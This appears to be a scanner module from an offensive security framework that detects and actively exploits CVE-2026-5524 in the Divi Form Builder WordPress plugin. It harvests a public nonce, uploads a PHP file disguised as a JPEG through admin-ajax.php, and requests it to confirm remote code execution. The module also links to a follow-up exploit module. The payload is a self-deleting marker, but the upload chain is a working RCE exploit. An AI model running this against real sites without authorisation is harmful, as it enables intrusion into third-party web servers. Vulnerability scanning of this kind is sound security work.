#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Divi Form Builder <= 5.1.8 phtml upload RCE (CVE-2026-5524)."""

import hashlib
import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "divi-form-builder"
_VULN_HIGH = (5, 1, 8)
_FB_PATHS = ("/", "/contact", "/contact-us", "/get-in-touch", "/quote", "/demo")
_NONCE_RE = re.compile(r'"fb_nonce"\s*:\s*"([a-f0-9]{10})"')


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Divi Form Builder CVE-2026-5524 detect",
        "description": (
            "Detects de_fb_image_upload with acceptFileTypes=phtml and public fb_nonce."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-5524",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-5524"],
        "modules": ["exploits/multi/http/divi_fb_cve_2026_5524_upload_rce"],
        "tags": ["web", "scanner", "wordpress", "divi", "file-upload", "cve-2026-5524"],
        "agent": {
            "approval_required": True,
            "chain": {
                "suggested_followups": ["exploits/multi/http/divi_fb_cve_2026_5524_upload_rce"],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)
    upload_probe = OptBool(True, "Upload proof .phtml shell", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _fb_nonce(self):
        for rel in _FB_PATHS:
            path = self._join(rel if rel.startswith("/") else f"/{rel}")
            page = self.http_request(method="GET", path=path, allow_redirects=True)
            if not page or int(page.status_code or 0) != 200:
                continue
            html = page.text or ""
            if "de_fb_obj" not in html:
                continue
            m = _NONCE_RE.search(html)
            if m:
                return m.group(1)
        return ""

    def run(self):
        base = self.wp_normalize_base_path(self.base_path or "/")
        version = self.wp_plugin_version(_PLUGIN, base) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        nonce = self._fb_nonce()
        if not nonce:
            return False
        if not self.upload_probe:
            self.set_info(
                severity="high",
                reason="Divi Form Builder fb_nonce exposed",
                cve="CVE-2026-5524",
            )
            return True
        fname = f"ks{secrets.token_hex(4)}"
        marker = secrets.token_hex(8)
        md5 = hashlib.md5(marker.encode()).hexdigest()
        boundary = "----KittyDFB5524"
        parts = [
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\nde_fb_image_upload\r\n",
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"fb_nonce\"\r\n\r\n{nonce}\r\n",
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"acceptFileTypes\"\r\n\r\nphtml\r\n",
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{fname}.phtml\"\r\n"
            f"Content-Type: image/jpeg\r\n\r\n<?php echo md5('{marker}');unlink(__FILE__);?>\r\n",
            f"--{boundary}--\r\n",
        ]
        up = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
            data="".join(parts).encode(),
            allow_redirects=False,
        )
        if not up or fname not in (up.text or ""):
            return False
        shell = self.http_request(
            method="GET",
            path=self._join(f"/wp-content/uploads/de_fb_uploads/{fname}.phtml"),
            allow_redirects=False,
        )
        if shell and md5 in (shell.text or ""):
            self.set_info(
                severity="critical",
                reason="Divi Form Builder arbitrary .phtml upload executed",
                path="/wp-content/uploads/de_fb_uploads/",
                cve="CVE-2026-5524",
            )
            return True
        return False
